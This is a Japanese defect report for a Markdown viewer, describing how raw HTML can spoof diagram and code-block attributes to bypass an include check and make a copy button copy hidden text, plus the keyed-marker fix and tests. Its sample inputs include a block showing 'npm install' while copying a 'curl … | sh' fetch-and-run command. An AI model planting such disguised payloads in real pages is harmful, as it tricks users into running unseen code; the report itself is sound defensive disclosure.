## 1. 症状（コードから導いたもの）

**文書に次の生 HTML を書くだけで起きる。** サニタイズ（MD-072）は `div` の `class="code-block"` と `data-lang` / `data-mermaid` / `data-source` / `data-plantuml` / `data-puml-error` を形のうえで通し（`internal/renderer/sanitize.go:85-86`・`sanitize.go:97-98`）、`pre` の `class="plantuml-source"` / `"mermaid-source"` も通す（`sanitize.go:38-47`・`sanitize.go:85-86`）。Go の変換が出す本物のブロックも同じ形である（`internal/renderer/mermaid.go:94-97`・`plantuml.go:218-228`）。

| # | 文書に書くもの | 起きること | 経路 |
| --- | --- | --- | --- |
| 1 | `<div class="code-block" data-plantuml="1" data-source="@startuml&#10;!include https://example.com/x.puml&#10;@enduml"><pre class="plantuml-source"></pre></div>` | **取り込み指令の検査（MD-084）を通らずに、`!include` を含む原文が PlantUML の処理系へ渡る。** 文書に PlantUML のブロックが 1 つも無くても、**5 MiB の資産（`viz-global.js` / `plantuml.js`）を読み込む**（NFR-013） | Go 側の検査（IMP-119）はフェンス付きコードブロックだけを見る。フロントエンドは `viewer.js:132` で `drawPlantUML` を**条件なしで**呼び、`lazy.js:229` が `.code-block[data-plantuml] pre.plantuml-source` を拾い、`lazy.js:283` が `block.dataset.source` をそのまま `plantuml.render` に渡す |
| 2 | `<div class="code-block" data-source="curl https://example.com/x \| sh"><pre><code>npm install</code></pre></div>` | **画面には `npm install` と出るのに、コピーボタンは `curl https://example.com/x \| sh` をコピーする**（見えている内容とコピーされる内容の食い違い） | `copy.js:20-23` の `attachCopyButtons` はすべての `.code-block` にボタンを付け、`copy.js:55-57` の `sourceOf` は **`data-source` があればそれを先に使う** |
| 3 | `<div class="code-block" data-mermaid="1" data-source="flowchart LR&#10;A-->B"><pre class="mermaid-source">(何でもよい)</pre></div>`（文書に本物の Mermaid のブロックが 1 つ以上ある場合） | **生 HTML のブロックが Mermaid の図として描かれる。** 画面の `pre` に書いた文字とは別の原文が図になり、コピーボタンもその原文をコピーする | `viewer.js:124` は Go 側の `needsMermaid` が真のときだけ `drawMermaid` を呼ぶ。呼ばれると `lazy.js:79` が `.code-block[data-mermaid] pre.mermaid-source` を拾い、`lazy.js:152` が `block.dataset.source` を描く |

- **1 は現状では潜在的である。** 同梱している `@plantuml/core` は `!include` で通信しないことを確かめている（MD-084）。**しかし MD-084 が Go 側で塞いでいるのは、まさに「資産の自動更新（BR-043）で通信が有効になる」危険であり、その防御が生 HTML 1 つで迂回できる。**
- **2 は今でも起きる。** FR-063（`Copy link address`）で「見えているリンク先とコピーされる文字列を食い違わせない」ために鍵を使った（IMP-120）のと**同じ種類の穴**が、コピーボタンに残っていた。コマンドの例をコピーしてターミナルへ貼る使い方で、**利用者が見ていない文字列を実行させうる。**
- **3 の図は `securityLevel: 'strict'`（MD-081）で描かれる**ため、書き手がフェンス付きの Mermaid ブロックで書けること以上はできない。問題は、**見えている原文と描かれる図とコピーされる原文が食い違う**ことである。
- `data-puml-error` の偽装は、そのブロックを描かないだけで害は無い。数式（`.math-inline` / `.math-block`）・Alerts・脚注のクラスの偽装も、書き手が本来の記法で書けること以上を起こさない。

> [!IMPORTANT]
> **サニタイズは「属性の形」しか見られない。** Go の変換が出した属性と、生 HTML に書かれた同じ属性は、
> サニタイズの後では区別がつかない（IMP-120 の IMPORTANT）。**目印を属性の有無で判断する限り、書き手は同じ属性を書くだけで偽装できる。**

---

## 2. 原因

### 2.1 図のブロックの目印を、属性の有無で判断している

IMP-115 / IMP-119 は、Go の変換が図のブロックを `div.code-block` と `data-mermaid` / `data-plantuml` / `data-source` で包むと定める。IMP-116 はこれを生 HTML にも許可する（許可しないと Go 自身の出力が消える。サニタイズは変換の後に掛かるため）。IMP-230 / IMP-233 はそのクラスと属性で描画対象を選び、IMP-221 は「`data-source` 属性があればその値」をコピーすると定める。**どこにも「その目印が Go の変換から来たか」を確かめる規定が無い。**

### 2.2 鍵の仕組みはあったが、図とコードに使っていなかった

4.39.0 で編集・並べ替え・リンクの目印に**変換ごとの乱数の鍵**を入れた（IMP-120）。書き手は変換より前に文書を書くため、鍵を知りようがない。**同じ理由で図のブロックにも要ったが、目印の対象はタスク・表・セル・リンクに限られていた。** IMP-120 の IMPORTANT が「属性の有無や形で判断すると偽装できる」と書きながら、その範囲を編集の目印に閉じていた。

---

## 3. 原因の分類 — 仕様か、実装か

### 3.1 一次原因 — **仕様の不足**

NFR-030 は「文書は任意の第三者から受け取りうる」ことを前提とし、MD-084 は「描画処理系の振る舞いに依存せずに担保する」と定める。**しかし実装仕様は、図の描画対象とコピーの原文を、生 HTML でも書ける属性だけで決めると定めていた**（IMP-221 の取得順序、IMP-230 / IMP-233 のセレクタ、IMP-116 の許可）。要求の前提が、目印の判断の規定まで降りていなかった。

### 3.2 実装は仕様どおりである

`lazy.js` と `copy.js` のセレクタと `data-source` の扱いは、IMP-221 / IMP-230 / IMP-233 のとおりである。

## 4. なぜ見つからなかったのか

| 層 | 見つからなかった理由 |
| --- | --- |
| 単体テスト | サニタイズの単体テスト（UT-209）は**「許可した属性が残ること」と「危険な要素が消えること」**を見る。許可した属性を**書き手が使ったとき何が起きるか**は、フロントエンドの側にあり対象外（UT-002） |
| 描画スモーク（BR-054） | `smoke.md` に**生 HTML で偽装した図のブロックが無い。** 4.43.0 で目印の照合の検査（UT-815）を足したが、対象はタスク・表・セル・リンクだけだった |
| 自動 E2E | ウィンドウを操作しない（E2E-020） |
| 手動テスト | 検証用の文書に、**図のブロックの形をした生 HTML が無い。** E2E-240 は `!include` を**フェンス付きのブロック**で書いており、Go 側の検査を通る経路しか見ていない |
| 仕様レビュー | 4.39.0 で鍵を入れたとき、**「目印を属性で判断している箇所」を全体から洗い出さず**、新しく足す機能の目印だけを対象にした |

> [!IMPORTANT]
> **防御を足したときは、同じ形の判断をしている既存の箇所も洗い出す。** 鍵（IMP-120）は「属性の形では偽装を防げない」
> という理由で入れたものであり、その理由は v1.0.0 からある図のブロックとコピーボタンにも当てはまっていた。

## 5. 修正方法

### 5.1 採った案 — 変換ごとの鍵を、図のブロックの目印にも使う

| 対象 | 変えること | 規定 |
| --- | --- | --- |
| 要求 | NFR-030 に「**図の描画対象・コピーされる原文**・書き換えの対象・並べ替えの対象・書かれたとおりのリンク先を、生 HTML で偽装できない」を足す。MD-084 に「図のブロックの目印も生 HTML で偽装できない（鍵）」。MD-072 の NOTE と FR-141 の「描画後の属性から判断しない」を「属性の有無や形だけで判断しない。変換ごとの鍵と照合する」に。BR-054 の「目印の照合」に図のブロックと `ownSource` を足す | NFR-030, MD-084, MD-072, FR-141, BR-054 |
| Go | Mermaid のブロックの `div.code-block` に **`data-ref="<鍵>:mermaid:<n>"`**、PlantUML のブロック（描画するものも、取り込み指令で拒んだものも）に **`data-ref="<鍵>:plantuml:<n>"`** を付ける。n は文書の中のその種類のブロックの出現順（0 起点。描画に失敗・拒否したものも数える。FR-120 の「同じ対象」と同じ数え方）。サニタイズは `div` の `data-ref` を `^[0-9a-f]{16}:(?:mermaid\|plantuml):[0-9]+$` に限って通す | IMP-115, IMP-119, IMP-120, IMP-116 |
| フロントエンド | 鍵の照合を**新しい葉のモジュール `js/refs.js`** に集め（`isOwnRef` / `ownLinkTarget` / 新設の **`ownSource(block)`**）、**鍵を読むのはこのモジュールだけ**とする。描画するのは `isOwnRef(block, 'mermaid')` / `isOwnRef(block, 'plantuml')` が真のブロックだけとし、**PlantUML の資産を読むかどうか（NFR-013）も鍵の合う PlantUML ブロックの有無で決める。** 描く原文とコピーする原文は `ownSource(block)` とし、鍵の合わない `data-source` は使わない（コピーは `pre code` の文字に戻る）。FR-120 のボタンの対象も鍵の合う図だけ | IMP-260, IMP-221, IMP-230, IMP-233, IMP-228 |
| 検査 | 変換結果の図のブロックに鍵付きの `data-ref` が出ること（UT-217）、サニタイズが形の崩れた `data-ref` を落とすこと（UT-209）、描画スモークで偽装した図のブロックとコードブロックが対象にならないこと（UT-815。`smoke.md` に偽装したブロックを足す） | UT-217, UT-209, UT-815, BR-054 |
| 手動テスト | **E2E-328** を新設（検証用データ `testdata/e2e/markers.md`）。偽装した PlantUML / Mermaid のブロックが図にならず、`data-source` を偽装したコードブロックのコピーで**見えている文字**が貼られ、本物の図は描けてコピーできることを確かめる | E2E-328, E2E-012 |

- **鍵は変換のたびに作る乱数である**（IMP-102）。書き手は変換より前に文書を書くため、鍵を知りようがない。
- **生 HTML の図のブロックは、書かれたとおりの HTML として残る**（`pre` に書いた文字がそのまま見える）。描画もしないが、消しもしない。

### 5.2 採らなかった案

| 案 | 採らない理由 |
| --- | --- |
| 図とコードの原文を HTML の属性に載せず、`DocumentDTO` に番号付きの一覧で渡す（HTML には鍵付きの番号だけを置く） | 属性に原文が無くなる分だけ堅いが、**DTO・ゴールデンテスト（UT-214）・コピー・テーマ切り替えの描き直し（IMP-243）の変更が大きい。** 鍵の照合だけで偽装は防げ、判断の方式も編集の目印（IMP-120）と 1 つに揃う |
| 許容して明記する（同梱の PlantUML は通信しないため潜在的な穴にとどまる） | **コピーの食い違い（1 章の 2）が残る。** また MD-084 は「処理系の振る舞いに依存せずに担保する」ことを目的にしており、許容はその目的と矛盾する |
| サニタイズで、生 HTML の `data-plantuml` / `data-source` などを落とす | **サニタイズは Go の出力と生 HTML を区別できない**（変換の後に掛かる）。落とせば Go 自身の図のブロックも消える。区別の手段が鍵しか無いことは IMP-120 の IMPORTANT が述べている |
| フロントエンドで `data-source` と `pre` の中身が一致するときだけ使う | **描画後は `pre` が SVG に置き換わり、比べる相手が無くなる**（IMP-115 が `data-source` を持たせた理由）。テーマ切り替えの描き直しでも同じ |

## 6. 影響範囲

- **文書の内容は変わらない。** ファイルは書き換わらない。
- **1（取り込み指令の迂回）**: 現在の同梱資産では外部へ通信しない。**資産の更新（BR-043）で上流の振る舞いが変わった場合に、NFR-032（外部へ通信しない）が崩れうる。** NFR-013 の遅延ロードは今でも崩れる（PlantUML を含まない文書で 5 MiB を読む）。
- **2（コピーの食い違い）**: 利用者が見ていない文字列をクリップボードへ入れる。**貼り付け先がターミナルなら、見ていないコマンドを実行しうる。**
- **v1.1.0 の書き込み先には影響しない。** 編集の目印（`data-ref` の `task` / `table` / `cell`）は既に鍵で照合しており、Go 側も鍵の合わない指示を拒む（IMP-109, IMP-195）。

## 7. 修正後の検証方法

### 7.1 機械的な確認

| 確認 | 手段 |
| --- | --- |
| Mermaid と PlantUML のブロック（拒んだものを含む）に `data-ref="<鍵>:mermaid:<n>"` / `"<鍵>:plantuml:<n>"` が付き、鍵が空なら付かない | UT-217 |
| サニタイズが、形の合う `div` の `data-ref` だけを通す | UT-209 |
| 本番の `refs.js` の `isOwnRef` / `ownSource` が、偽装した図のブロックとコードブロックを対象にしない | 描画スモーク（BR-054, E2E-109。判定は UT-815） |

### 7.2 実機での確認（W1）

**E2E-328** の手順で行う。**ネットワークを切断して行う**（1 章の 1 で待たされる箇所が無いことも見る）。**実装の前に同じ手順で症状（偽装した PlantUML が処理系へ渡る、コピーで `curl …` が貼られる）が出ることを確かめてから直す。**

### 7.3 回帰

図の描画対象の選び方を変えるため、次を見る: Mermaid 図（E2E-234）、PlantUML 図と制限（E2E-239 / E2E-240）、テーマ切り替えの描き直し（E2E-281 / E2E-283）、コードブロックと図のコピー（E2E-291 / E2E-292）、図と画像のボタン（E2E-351〜E2E-354）、ゴールデンテスト（UT-214。**差分は図のブロックの `data-ref` だけであることを読む**。UT-039）。
